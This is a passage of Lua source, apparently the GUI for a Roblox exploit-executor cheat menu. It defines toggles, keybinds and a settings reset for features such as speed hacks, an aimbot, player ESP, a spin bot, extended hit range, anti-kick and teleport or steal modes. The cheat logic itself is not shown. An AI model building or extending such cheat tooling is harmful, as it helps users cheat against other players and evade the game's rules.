        pageLayout.SortOrder = Enum.SortOrder.LayoutOrder
        local pagePad = Instance.new("UIPadding", page)
        pagePad.PaddingLeft = UDim.new(0, 16)
        pagePad.PaddingRight = UDim.new(0, 14)
        pagePad.PaddingTop = UDim.new(0, 10)
        pagePad.PaddingBottom = UDim.new(0, 10)

        TabRefs.contents[name] = page

        if i == 1 then
            currentTab = {Btn = btn, Pg = page}
        end

        btn.MouseButton1Click:Connect(function()
            if currentTab then
                __HH.setIceSectionActive(currentTab.Btn, false)
                currentTab.Btn.BackgroundTransparency = 1
                currentTab.Pg.Visible = false
            end
            btn.BackgroundTransparency = 1
            page.Visible = true
            currentTab = {Btn = btn, Pg = page}
            TabRefs.active = name
            __HH.setIceSectionActive(btn, true)
        end)
    end

    local function styleCapsuleBtn(btn, isAccent)
        btn.BackgroundColor3 = isAccent and Color3.fromRGB(10, 32, 68) or Color3.fromRGB(7, 18, 38)
        btn.BackgroundTransparency = 0.08
        btn.BorderSizePixel = 0
        btn.TextColor3 = isAccent and WHITE or CYAN_SECT
        btn.Font = Enum.Font.GothamSemibold
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", btn)
        st.Color = isAccent and BLUE_GLOW or Color3.fromRGB(48, 120, 210)
        st.Thickness = 1.3
        st.Transparency = 0.14
        local grad = Instance.new("UIGradient", btn)
        grad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 68, 138)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 34, 72)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 56, 118))
        })
        grad.Rotation = 90
        return st
    end

    local function mkSect(parent, txt)
        local f = Instance.new("Frame", parent)
        f.Size = UDim2.new(ROW_W, 0, 0, 20); f.BackgroundTransparency = 1
        f.LayoutOrder = #parent:GetChildren() + 1
        local l = Instance.new("TextLabel", f)
        l.Size = UDim2.new(1, 0, 1, 0); l.BackgroundTransparency = 1
        l.Text = txt:upper(); l.TextColor3 = CYAN_SECT
        l.Font = Enum.Font.GothamBold; l.TextSize = 9
        l.TextXAlignment = Enum.TextXAlignment.Left
        local line = Instance.new("Frame", f)
        line.Size = UDim2.new(1, 0, 0, 1); line.Position = UDim2.new(0, 0, 1, -1)
        line.BackgroundColor3 = Color3.fromRGB(42, 86, 142); line.BackgroundTransparency = 0.72; line.BorderSizePixel = 0
    end

    local function mkRow(parent)
        local f = Instance.new("Frame", parent)
        f.Size = UDim2.new(ROW_W, 0, 0, 34); f.BackgroundTransparency = 1
        f.LayoutOrder = #parent:GetChildren() + 1
        local rowLine = Instance.new("Frame", f)
        rowLine.Size = UDim2.new(1, 0, 0, 1); rowLine.Position = UDim2.new(0, 0, 1, -1)
        rowLine.BackgroundColor3 = Color3.fromRGB(42, 82, 136); rowLine.BackgroundTransparency = 0.80
        rowLine.BorderSizePixel = 0; rowLine.ZIndex = 3
        return f
    end

    local function mkLabel(row, txt)
        local l = Instance.new("TextLabel", row)
        l.Size = UDim2.new(0.62, 0, 1, 0); l.Position = UDim2.new(0, 0, 0, 0)
        l.BackgroundTransparency = 1; l.Text = txt
        l.TextColor3 = WHITE; l.Font = Enum.Font.GothamSemibold
        l.TextSize = 13; l.TextXAlignment = Enum.TextXAlignment.Left
        l.ZIndex = 4
    end

    local function mkToggle(parent, txt, cb, initVal)
        local row = mkRow(parent)
        mkLabel(row, txt)
        local chk = Instance.new("TextButton", row)
        chk.Size = UDim2.new(0, 48, 0, 24); chk.Position = UDim2.new(1, -50, 0.5, -12)
        chk.BackgroundColor3 = initVal and PILL_ON or CHECK_OFF
        chk.BackgroundTransparency = 0.08
        chk.BorderSizePixel = 0; chk.Text = ""; chk.AutoButtonColor = false; chk.ZIndex = 5
        Instance.new("UICorner", chk).CornerRadius = UDim.new(1, 0)
        local chkStroke = Instance.new("UIStroke", chk)
        chkStroke.Color = BLUE_GLOW; chkStroke.Thickness = 1.3; chkStroke.Transparency = 0.18

        local knob = Instance.new("Frame", chk)
        knob.Size = UDim2.new(0, 18, 0, 18)
        knob.Position = initVal and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
        knob.BackgroundColor3 = Color3.fromRGB(245, 250, 255)
        knob.BorderSizePixel = 0; knob.ZIndex = 6
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local state = initVal == true
        local function sv(s)
            state = s == true
            TS:Create(chk, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {
                BackgroundColor3 = state and PILL_ON or CHECK_OFF
            }):Play()
            TS:Create(knob, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {
                Position = state and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
            }):Play()
            TS:Create(chkStroke, TweenInfo.new(0.16), {
                Color = state and Color3.fromRGB(115, 198, 255) or BLUE_GLOW
            }):Play()
        end
        sv(state)
        chk.MouseButton1Click:Connect(function()
            if __HH._anyKeyListening then return end
            state = not state; sv(state); cb(state)
        end)
        return sv
    end

    local function mkBoxRow(parent, txt, default, cb)
        local row = mkRow(parent)
        mkLabel(row, txt)
        local tb = Instance.new("TextBox", row)
        tb.Size = UDim2.new(0, 74, 0, 24); tb.Position = UDim2.new(1, -76, 0.5, -12)
        tb.BackgroundColor3 = INP_BG; tb.BackgroundTransparency = 0.15
        tb.Text = tostring(default)
        tb.TextColor3 = WHITE; tb.Font = Enum.Font.GothamSemibold
        tb.TextSize = 12; tb.ClearTextOnFocus = false; tb.ZIndex = 5
        Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 7)
        local bs = Instance.new("UIStroke", tb); bs.Color = DIM_LINE; bs.Thickness = 1.2; bs.Transparency = 0.25
        tb.Focused:Connect(function() TS:Create(bs, TweenInfo.new(0.12), {Color=BLUE_GLOW, Transparency=0}):Play() end)
        tb.FocusLost:Connect(function()
            TS:Create(bs, TweenInfo.new(0.12), {Color=DIM_LINE, Transparency=0.25}):Play()
            if cb then local n = tonumber(tb.Text); if n then cb(n) else tb.Text = tostring(default) end end
        end)
        return tb
    end

    local function mkKB(parent, kbEntry, cb)
        local btn = Instance.new("TextButton", parent)
        btn.Size = UDim2.new(0, 44, 0, 20); btn.Position = UDim2.new(1, -108, 0.5, -10)
        btn.BackgroundColor3 = INP_BG; btn.BackgroundTransparency = 0.12; btn.BorderSizePixel = 0
        local function getLabel()
            return (kbEntry.gp and __HH.getKeyDisplayName(kbEntry.gp, true)) or (kbEntry.kb and kbEntry.kb.Name) or "None"
        end
        btn.Text = getLabel(); btn.TextColor3 = CYAN_SECT
        btn.Font = Enum.Font.GothamBold; btn.TextSize = 9; btn.ZIndex = 5
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        local bs = Instance.new("UIStroke", btn); bs.Color = DIM_LINE; bs.Thickness = 1.1; bs.Transparency = 0.25
        local li, lc, pv, listenStart = false, nil, btn.Text, 0
        btn.MouseButton1Click:Connect(function()
            if li then
                li = false; __HH._anyKeyListening = false
                if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; return
            end
            pv = btn.Text; li = true; __HH._anyKeyListening = true; listenStart = tick(); btn.Text = "..."
            lc = __HH.UIS.InputBegan:Connect(function(inp)
                if not li then return end
                if inp.KeyCode == Enum.KeyCode.Escape then
                    li = false; __HH._anyKeyListening = false
                    if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; return
                end
                local isGp = __HH.isGamepadInput(inp)
                if isGp and tick()-listenStart < 0.15 then return end
                if not __HH.isBindableInput(inp) then return end
                btn.Text = __HH.getKeyDisplayName(inp.KeyCode, isGp)
                pv = btn.Text; li = false; __HH._anyKeyListening = false
                if lc then lc:Disconnect(); lc = nil end
                if cb then cb(inp.KeyCode, isGp) end
            end)
        end)
        return btn
    end

    local function mkToggleKB(parent, txt, kbEntry, onToggle, onKB)
        local row = mkRow(parent)
        mkLabel(row, txt)
        if kbEntry then
            mkKB(row, kbEntry, function(k, isGp)
                if isGp then kbEntry.gp = k; kbEntry.kb = nil else kbEntry.kb = k; kbEntry.gp = nil end
                if onKB then onKB(k, isGp) end
            end)
        end
        local chk = Instance.new("TextButton", row)
        chk.Size = UDim2.new(0, 48, 0, 24); chk.Position = UDim2.new(1, -50, 0.5, -12)
        chk.BackgroundColor3 = CHECK_OFF; chk.BackgroundTransparency = 0.08
        chk.BorderSizePixel = 0; chk.Text = ""; chk.AutoButtonColor = false; chk.ZIndex = 5
        Instance.new("UICorner", chk).CornerRadius = UDim.new(1, 0)
        local chkStroke = Instance.new("UIStroke", chk); chkStroke.Color = BLUE_GLOW; chkStroke.Thickness = 1.3; chkStroke.Transparency = 0.18
        local knob = Instance.new("Frame", chk)
        knob.Size = UDim2.new(0, 18, 0, 18)
        knob.Position = UDim2.new(0, 3, 0.5, -9)
        knob.BackgroundColor3 = Color3.fromRGB(245, 250, 255)
        knob.BorderSizePixel = 0; knob.ZIndex = 6
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
        local state = false
        local function sv(s)
            state = s == true
            TS:Create(chk, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {
                BackgroundColor3 = state and PILL_ON or CHECK_OFF
            }):Play()
            TS:Create(knob, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {
                Position = state and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
            }):Play()
        end
        chk.MouseButton1Click:Connect(function()
            if __HH._anyKeyListening then return end
            state = not state; sv(state); if onToggle then onToggle(state) end
        end)
        return sv
    end

    local function mkActionRow(parent, txt, onActivate, kbEntry)
        local row = mkRow(parent)
        mkLabel(row, txt)
        if kbEntry then
            mkKB(row, kbEntry, function(k, isGp)
                if isGp then kbEntry.gp = k; kbEntry.kb = nil else kbEntry.kb = k; kbEntry.gp = nil end
                saveConfig()
            end)
        end
        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(0, 48, 0, 24); btn.Position = UDim2.new(1, -50, 0.5, -12)
        btn.Text = "Run"; btn.TextSize = 10
        btn.AutoButtonColor = false; btn.ZIndex = 5
        styleCapsuleBtn(btn, true)
        btn.MouseButton1Click:Connect(function()
            TS:Create(btn, TweenInfo.new(0.06), {BackgroundColor3 = PILL_ON}):Play()
            task.delay(0.14, function()
                TS:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = BTN_ACT}):Play()
            end)
            if onActivate then onActivate() end
        end)
        return row
    end

    local sfSpeed   = TabRefs.contents["Speed"]
    local sfCombat  = TabRefs.contents["Combat"]
    local sfMechns  = TabRefs.contents["Mechns"]
    local sfVisual  = TabRefs.contents["Visual"]
    local sfExtra   = TabRefs.contents["Extra"]
    local sfMobile  = TabRefs.contents["Mobile"]

    -- ─── Shared Reset All Settings logic ───────────────────────────────────
    -- Wipes every saved toggle/speed/keybind/UI setting back to the script's
    -- hardcoded defaults. Does NOT touch the selected device (PC/Mobile/
    -- Controller) — that is what "Reset Device" is for. Used by both the
    -- Extra tab and Mobile tab "Reset All Settings" buttons.
    local function performResetAllSettings()
        -- Turn off anything currently running so the reset takes effect
        -- immediately, not just on the next join.
        pcall(function() if __HH.tpLockEnabled and stopTPLock then stopTPLock() end end)
        pcall(function() if __HH.batV2Enabled and toggleBatV2 then toggleBatV2() end end)
        pcall(function() if autoLeftEnabled and stopAutoLeft then autoLeftEnabled = false; stopAutoLeft() end end)
        pcall(function() if autoRightEnabled and stopAutoRight then autoRightEnabled = false; stopAutoRight() end end)
        pcall(function() if __HH.antiRagdollEnabled and __HH.stopAntiRagdoll then __HH.stopAntiRagdoll() end end)
        pcall(function() if __HH.medusaCounterEnabled and stopMedusaCounter then stopMedusaCounter() end end)
        pcall(function() if __HH.batCounterEnabled and stopBatCounter then stopBatCounter() end end)
        pcall(function() if __HH.unwalkEnabled and __HH.stopUnwalk then __HH.stopUnwalk() end end)
        pcall(function() if __HH.antiLagEnabled and disableAntiLag then disableAntiLag() end end)
        pcall(function() if __HH.stretchRezEnabled and disableStretchRez then disableStretchRez() end end)
        pcall(function() if __HH.autoTPEnabled and __HH.stopAutoTP then __HH.stopAutoTP() end end)
        pcall(function() if __HH.antiDieEnabled and __HH.stopAntiDie then __HH.stopAntiDie() end end)
        pcall(function() if __HH.espEnabled and stopPlayerESP then stopPlayerESP() end end)
        pcall(function() if __HH.bodyLockEnabled and __HH.stopBodyLock then __HH.stopBodyLock() end end)
        pcall(function() if __HH.headlessEnabled and applyHeadless and LP.Character then applyHeadless(LP.Character, false) end end)
        pcall(function() if __HH.korbloxEnabled and applyKorblox and LP.Character then applyKorblox(LP.Character, false) end end)
        pcall(function() if applyAccessoryPack then applyAccessoryPack("Off") end end)
        pcall(function() if _G.PureSpinBot and _G.PureSpinBot.enabled and _G.PureSpinBot.stop then _G.PureSpinBot.enabled = false; _G.PureSpinBot.stop() end end)
        pcall(function() if _G.HorizonStealModes then _G.HorizonStealModes.SetEnabled(false) end end)
        pcall(function() if _G.PureMirrorTPDown and _G.PureMirrorTPDown.setEnabled then _G.PureMirrorTPDown.setEnabled(false) end end)
        pcall(function() if _G.PureBatSpam and _G.PureBatSpam.setEnabled then _G.PureBatSpam.setEnabled(false) end end)
        pcall(function() if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setEnabled then _G.Round3SpeedBooster.setEnabled(false) end end)

        -- Speeds / numeric values back to script defaults.
        NS = 60; CS = 30
        LAGGER_SPEED = 13; LAGGER_CARRY_SPEED = 13
        aimbotV1Speed = 56
        autoCarrySpeedEnabled = false
        carrySpeedActive = false; laggerModeEnabled = false; laggerCarryToggled = false
        speedMode = false; laggerPhase = 0
        pcall(function()
            if _G.Round3SpeedBooster then
                if _G.Round3SpeedBooster.setNormalSpeed then _G.Round3SpeedBooster.setNormalSpeed(62) end
                if _G.Round3SpeedBooster.setCarrySpeed then _G.Round3SpeedBooster.setCarrySpeed(32) end
                if _G.Round3SpeedBooster.setForceCarry then _G.Round3SpeedBooster.setForceCarry(false) end
            end
        end)
        batAimMode = "normal"
        uiScaleValue = 0.6
        __HH.autoTPHeight = 20
        __HH.floatHeight = 6
        __HH.mobileButtonsSize = 80
        __HH.bodyLockRange = 20
        __HH.currentSkyTheme = "Off"
        currentAccessoryPack = "Off"
        __HH.aceSelectedAnimationPack = "OFF"

        -- Toggles back to OFF / defaults.
        __HH.antiRagdollEnabled = false
        __HH.infJumpEnabled = false
        __HH.infJumpMode = "manual"
        __HH.medusaCounterEnabled = false
        __HH.medusaResetEnabled = false
        __HH.batCounterEnabled = false
        __HH.unwalkEnabled = false
        __HH.antiLagEnabled = false
        __HH.stretchRezEnabled = false
        __HH.autoTPEnabled = false
        __HH.autoJumpBrainrot = false
        __HH.floatEnabled = false
        __HH.guiTransparencyEnabled = false
        __HH.circleButtonsEnabled = false
        __HH.shapeButtonsEnabled = false
        __HH.rectangularButtonsEnabled = false
        __HH.antiDieEnabled = false
        __HH.autoResetOnDeath = false
        __HH.uiLocked = false; _G.YousefUiLocked = false
        __HH.perButtonDragEnabled = true
        __HH.batV2Enabled = false
        __HH.espEnabled = false
        __HH.headlessEnabled = false
        __HH.korbloxEnabled = false
        __HH.bodyLockEnabled = false
        __HH.antiFlingEnabled = false
        __HH.tpLockEnabled = false
        autoSwingEnabled = false
        autoLeftEnabled = false; autoRightEnabled = false
        antiKickEnabled = false

        -- Mobile-specific settings back to defaults.
        __HH.mobileButtonsEnabled = (__HH.selectedDevice == "MOBILE")

        -- Keybinds back to their original defaults.
        __HH.KB.DropBrainrot  = {kb = Enum.KeyCode.X,           gp = nil}
        __HH.KB.TPLock        = {kb = Enum.KeyCode.E,           gp = nil}
        __HH.KB.TPFloor       = {kb = Enum.KeyCode.F,           gp = nil}
        __HH.KB.GuiHide       = {kb = Enum.KeyCode.LeftControl, gp = nil}
        __HH.KB.SpeedToggle   = {kb = Enum.KeyCode.Q,           gp = nil}
        __HH.KB.LaggerToggle  = {kb = Enum.KeyCode.G,           gp = nil}
        __HH.KB.InstaReset    = {kb = Enum.KeyCode.R,           gp = nil}
        __HH.KB.AutoLeft      = {kb = Enum.KeyCode.Z,           gp = nil}
        __HH.KB.AutoRight     = {kb = Enum.KeyCode.C,           gp = nil}
        __HH.KB.BatV2Toggle   = {kb = Enum.KeyCode.V,           gp = nil}

        -- Button visibility (mobile buttons) back to all-on.
        __HH.buttonVisibility = {
            drop=true, tpDown=true, batV1=true, batV2=true, tpLock=true,
            lagger=true, laggerCarry=true, carrySpeed=true,
            instaReset=true,
        }

        -- Reset saved mobile button positions too, so "Reset All Settings"
        -- from the Mobile tab also puts the floating buttons back at their
        -- default layout.
        pcall(function() if writefile then writefile(MOB_POS_FILE, "{}") end end)

        -- Persist the wipe immediately, then rebuild the whole UI so every
        -- toggle/keybind label reflects the new defaults without needing a
        -- rejoin.
        saveConfig()
        task.delay(0.3, function()
            pcall(function()
                if __HH.mainFrame then __HH.mainFrame:Destroy() end
                buildGui()
                applyState()
                if __HH.mobileButtonsEnabled and buildMobileButtons then task.spawn(buildMobileButtons)
                elseif destroyMobileButtons then destroyMobileButtons() end
                if __HH.mainFrame then __HH.mainFrame.Visible = true end
            end)
        end)
    end

    -- Attaches a two-click "arm/confirm" reset flow to any button, calling
    -- performResetAllSettings() and optionally flashing a status message.
    local function wireResetAllButton(btn, defaultText, flashStatusFn)
        local armed = false
        local armedUntil = 0
        btn.MouseButton1Click:Connect(function()
            if not armed or tick() > armedUntil then
                armed = true
                armedUntil = tick() + 3
                btn.Text = "Confirm?"
                task.delay(3, function()
                    if armed and tick() > armedUntil - 0.05 then
                        armed = false
                        btn.Text = defaultText
                    end
                end)
                return
            end
            armed = false
            btn.Text = defaultText
            performResetAllSettings()
            if flashStatusFn then flashStatusFn("All settings reset to default!") end
        end)
    end

    -- Speed control helper: label + [-] [value box] [+] buttons
    local function mkSpeedCtrl(parent, txt, getVal, setVal, step)
        step = step or 5
        local row = Instance.new("Frame", parent)
        row.Size = UDim2.new(1,0,0,32); row.BackgroundTransparency = 1
        row.LayoutOrder = #parent:GetChildren() + 1
        mkLabel(row, txt)
        local minBtn = Instance.new("TextButton", row)
        minBtn.Size = UDim2.new(0,24,0,22); minBtn.Position = UDim2.new(1,-148,0.5,-11)
        minBtn.BackgroundColor3 = BTN_ACT; minBtn.BorderSizePixel = 0
        minBtn.Text = "-"; minBtn.TextColor3 = WHITE
        minBtn.Font = Enum.Font.GothamBlack; minBtn.TextSize = 15
        minBtn.AutoButtonColor = false; minBtn.ZIndex = 5
        Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0,5)
        local mStroke = Instance.new("UIStroke", minBtn); mStroke.Color = WHITE; mStroke.Thickness = 1
        local valTb = Instance.new("TextBox", row)
        valTb.Size = UDim2.new(0,52,0,22); valTb.Position = UDim2.new(1,-120,0.5,-11)
        valTb.BackgroundColor3 = INP_BG; valTb.Text = tostring(getVal())
        valTb.TextColor3 = WHITE; valTb.Font = Enum.Font.GothamBold
        valTb.TextSize = 11; valTb.ClearTextOnFocus = false
        valTb.TextXAlignment = Enum.TextXAlignment.Center; valTb.ZIndex = 5
        Instance.new("UICorner", valTb).CornerRadius = UDim.new(0,5)
        local tbStroke = Instance.new("UIStroke", valTb); tbStroke.Color = DIM_LINE; tbStroke.Thickness = 1
        valTb.Focused:Connect(function() TS:Create(tbStroke, TweenInfo.new(0.12), {Color=WHITE}):Play() end)
        valTb.FocusLost:Connect(function()
            TS:Create(tbStroke, TweenInfo.new(0.12), {Color=DIM_LINE}):Play()
            local n = tonumber(valTb.Text)
            if n then setVal(math.clamp(math.floor(n), 1, 500)) end
            valTb.Text = tostring(getVal())
        end)
        local plusBtn = Instance.new("TextButton", row)
        plusBtn.Size = UDim2.new(0,24,0,22); plusBtn.Position = UDim2.new(1,-64,0.5,-11)
        plusBtn.BackgroundColor3 = BTN_ACT; plusBtn.BorderSizePixel = 0
        plusBtn.Text = "+"; plusBtn.TextColor3 = WHITE
        plusBtn.Font = Enum.Font.GothamBlack; plusBtn.TextSize = 15
        plusBtn.AutoButtonColor = false; plusBtn.ZIndex = 5
        Instance.new("UICorner", plusBtn).CornerRadius = UDim.new(0,5)
        local pStroke = Instance.new("UIStroke", plusBtn); pStroke.Color = WHITE; pStroke.Thickness = 1
        local function flash(b)
            TS:Create(b, TweenInfo.new(0.07), {BackgroundColor3=WHITE}):Play()
            task.delay(0.14, function() TS:Create(b, TweenInfo.new(0.10), {BackgroundColor3=BTN_ACT}):Play() end)
        end
        minBtn.MouseButton1Click:Connect(function()
            setVal(math.max(1, getVal() - step)); valTb.Text = tostring(getVal()); flash(minBtn)
        end)
        plusBtn.MouseButton1Click:Connect(function()
            setVal(math.min(500, getVal() + step)); valTb.Text = tostring(getVal()); flash(plusBtn)
        end)
    end

    mkSect(sfSpeed, "Speed Values")
    local grabSpeedTb
    mkBoxRow(sfSpeed, "Normal Speed", NS, function(v)
        if v>0 and v<=500 then
            NS=v; CS=math.max(1, math.floor(NS/2)); saveConfig()
            -- Grab Speed is auto-derived from Normal Speed, so its own
            -- textbox must reflect the new value immediately instead of
            -- showing a stale number until the panel is reopened.
            if grabSpeedTb then grabSpeedTb.Text = tostring(CS) end
        end
    end)
    grabSpeedTb = mkBoxRow(sfSpeed, "Grab Speed",   CS, function(v) if v>0 and v<=500 then CS=v; saveConfig() end end)
    mkBoxRow(sfSpeed, "Lagger Normal", LAGGER_SPEED, function(v) if v>0 and v<=500 then LAGGER_SPEED=v end; saveConfig() end)
    mkBoxRow(sfSpeed, "Lagger Carry", LAGGER_CARRY_SPEED, function(v) if v>0 and v<=500 then LAGGER_CARRY_SPEED=v end; saveConfig() end)
    mkBoxRow(sfSpeed, "AIM BOT Speed", aimbotV1Speed, function(v) if v>0 and v<=500 then aimbotV1Speed=v end; saveConfig() end)
    setAutoCarrySpeedVisual = mkToggle(sfSpeed, "Auto Switch Speed", function(on)
        autoCarrySpeedEnabled = on
        if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
        saveConfig()
    end, autoCarrySpeedEnabled)

    mkSect(sfSpeed, "Round 3 Speed Boost")
    mkToggle(sfSpeed, "ROUND 3 SPEED", function(on)
        if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setEnabled then
            _G.Round3SpeedBooster.setEnabled(on)
        end
        saveConfig()
    end, (_G.Round3SpeedBooster and _G.Round3SpeedBooster.Enabled) == true)
    mkBoxRow(sfSpeed, "Normal Speed", (_G.Round3SpeedBooster and _G.Round3SpeedBooster.NormalSpeed) or 62, function(v)
        if v>0 and v<=500 then
            if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setNormalSpeed then
                _G.Round3SpeedBooster.setNormalSpeed(v)
            end
        end
        saveConfig()
    end)
    mkBoxRow(sfSpeed, "Carry Speed", (_G.Round3SpeedBooster and _G.Round3SpeedBooster.CarrySpeed) or 32, function(v)
        if v>0 and v<=500 then
            if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setCarrySpeed then
                _G.Round3SpeedBooster.setCarrySpeed(v)
            end
        end
        saveConfig()
    end)
    mkToggle(sfSpeed, "Force Carry", function(on)
        if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setForceCarry then
            _G.Round3SpeedBooster.setForceCarry(on)
        end
        saveConfig()
    end, (_G.Round3SpeedBooster and _G.Round3SpeedBooster.ForceCarry) == true)

    mkSect(sfCombat, "Combat")
    setAutoSwingVisual   = mkToggle(sfCombat, "Auto Swing",     function(on) autoSwingEnabled=on; saveConfig() end, autoSwingEnabled)
    __HH.setHitRangeVisual = mkToggle(sfCombat, "Hit Range", function(on)
        if on then startHorizonHitRange() else stopHorizonHitRange() end
        saveConfig()
    end, false)
    if _G.PureSpinBot then
        _G.PureSpinBot.setVisual = mkToggle(sfCombat, "SPIN BOT", function(on)
            _G.PureSpinBot.setEnabled(on)
            saveConfig()
        end, _G.PureSpinBot.enabled)
    end
    setAntiRagVisual     = mkToggle(sfCombat, "Anti Ragdoll",   function(on) __HH.antiRagdollEnabled=on; if on then __HH.startAntiRagdoll() else __HH.stopAntiRagdoll() end; saveConfig() end, __HH.antiRagdollEnabled)
    setMedusaResetVisual = mkToggle(sfCombat, "Medusa Reset",   function(on) __HH.medusaResetEnabled=on; saveConfig() end, __HH.medusaResetEnabled)
    setUnwalkVisual      = mkToggle(sfCombat, "Unwalk",         function(on) __HH.unwalkEnabled=on; if on then __HH.startUnwalk() else __HH.stopUnwalk() end; saveConfig() end, __HH.unwalkEnabled)

    mkSect(sfCombat, "Body Protection")
    __HH.setBodyLockVisual = mkToggle(sfCombat, "Body Lock", function(on)
        __HH.bodyLockEnabled=on==true
        if on and not __HH.batV2Enabled and not __HH.tpLockEnabled then __HH.startBodyLock() else __HH.stopBodyLock() end
        saveConfig()
    end, __HH.bodyLockEnabled)
    mkBoxRow(sfCombat, "Body Lock Range", __HH.bodyLockRange, function(v) __HH.bodyLockRange=math.clamp(math.floor(v),5,200);saveConfig() end)
    __HH.setAntiFlingVisual = mkToggle(sfCombat, "Anti Fling", function(on) __HH.antiFlingEnabled=on==true;saveConfig() end, __HH.antiFlingEnabled)

    mkSect(sfCombat, "Yousef")
    __HH.setBatCounterVisual  = mkToggle(sfCombat, "Bat Counter",    function(on) __HH.batCounterEnabled=on; if on then startBatCounter() else stopBatCounter() end; saveConfig() end, __HH.batCounterEnabled)
    setMedusaVisual      = mkToggle(sfCombat, "Medusa Counter", function(on) __HH.medusaCounterEnabled=on; if on then setupMedusa(LP.Character) else stopMedusaCounter() end; saveConfig() end, __HH.medusaCounterEnabled)




    _G.PureMirrorTPDownSetVisual = mkToggle(sfCombat, "MIRROR TP DOWN", function(on)
        if _G.PureMirrorTPDown and _G.PureMirrorTPDown.setEnabled then
            _G.PureMirrorTPDown.setEnabled(on)
        end
        saveConfig()
    end, (_G.PureMirrorTPDown and _G.PureMirrorTPDown.enabled
        and _G.PureMirrorTPDown.enabled()) == true)

    _G.PureBatSpamSetVisual = mkToggle(sfCombat, "Bat Spam", function(on)
        if _G.PureBatSpam and _G.PureBatSpam.setEnabled then
            _G.PureBatSpam.setEnabled(on)
        end
        saveConfig()
    end, (_G.PureBatSpam and _G.PureBatSpam.enabled
        and _G.PureBatSpam.enabled()) == true)

    __HH.setAntiDieVisual = mkToggle(sfCombat, "Anti Die", function(on)
        __HH.antiDieEnabled = on
        if on then __HH.startAntiDie() else __HH.stopAntiDie() end
        saveConfig()
    end, __HH.antiDieEnabled)

    __HH.setAutoResetOnDeathVisual = mkToggle(sfCombat, "Instant Reset on Die", function(on)
        __HH.autoResetOnDeath = on
        if on and __HH.antiDieEnabled then
            __HH.antiDieEnabled = false
            __HH.stopAntiDie()
            if __HH.setAntiDieVisual then __HH.setAntiDieVisual(false) end
        end
        __HH.setupDeathReset()
        saveConfig()
    end, __HH.autoResetOnDeath)

    mkSect(sfMechns, "Actions")
    mkActionRow(sfMechns, "Speed Toggle",  nil, __HH.KB.SpeedToggle)
    mkActionRow(sfMechns, "Lagger Toggle", nil, __HH.KB.LaggerToggle)
    mkActionRow(sfMechns, "Insta Reset",   function() __HH.FrameReset.ResetPlayer() end, __HH.KB.InstaReset)
    mkActionRow(sfMechns, "Drop Brainrot", function() runDrop() end,     __HH.KB.DropBrainrot)
    mkActionRow(sfMechns, "TP Down",       function() __HH.tpToGround() end,  __HH.KB.TPFloor)
    mkActionRow(sfMechns, "Hide GUI",      function() if __HH.mainFrame then __HH.mainFrame.Visible = not __HH.mainFrame.Visible end end, __HH.KB.GuiHide)

    mkSect(sfMechns, "Toggles")
    __HH.tpLockSetVisual = mkToggleKB(sfMechns, "TP BAT", __HH.KB.TPLock, function(on)
        if __HH._anyKeyListening then return end
        if on then
            
            if __HH.batV2Enabled then toggleBatV2() end
            toggleTPLock()
        else if __HH.tpLockEnabled then toggleTPLock() end end
        saveConfig()
    end, function() saveConfig() end)
    __HH.tpLockSetVisual(__HH.tpLockEnabled)

    __HH.batV2SetVisual = mkToggleKB(sfMechns, "AIM BOT", __HH.KB.BatV2Toggle, function(on)
        if __HH._anyKeyListening then return end
        if on then
            if _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart(true) then
                if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
                return
            end
            if __HH.tpLockEnabled then toggleTPLock() end
            toggleBatV2()
        else
            if __HH.batV2Enabled then toggleBatV2() end
        end
        saveConfig()
    end, function() saveConfig() end)
    __HH.batV2SetVisual(__HH.batV2Enabled)


    do
        local mRow = mkRow(sfMechns); mkLabel(mRow, "AIM Mode")
        local mBtns = {}
        local function mkAimModeBtn(lbl, xOff, mode)
            local b = Instance.new("TextButton", mRow)
            b.Size = UDim2.new(0,100,0,20); b.Position = UDim2.new(1,xOff,0.5,-10)
            b.BackgroundColor3 = (batAimMode==mode) and WHITE or BTN_ACT
            b.BorderSizePixel = 0; b.Text = lbl
            b.TextColor3 = (batAimMode==mode) and BLACK or Color3.fromRGB(180,180,200)
            b.Font = Enum.Font.GothamBold; b.TextSize = 8; b.AutoButtonColor = false; b.ZIndex = 5
            Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
            table.insert(mBtns, b)
            b.MouseButton1Click:Connect(function()
                if batAimMode == mode then return end
                batAimMode = mode
                b.BackgroundColor3 = WHITE; b.TextColor3 = BLACK
                for _, ob in ipairs(mBtns) do
                    if ob ~= b then
                        ob.BackgroundColor3 = BTN_ACT; ob.TextColor3 = Color3.fromRGB(180,180,200)
                    end
                end
                if __HH.batV2Enabled then
                    stopAimbotFull()
                    queueAutoBatStart()
                    if __HH.batV2SetVisual then __HH.batV2SetVisual(true) end
                    if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(true) end
                end
                saveConfig()
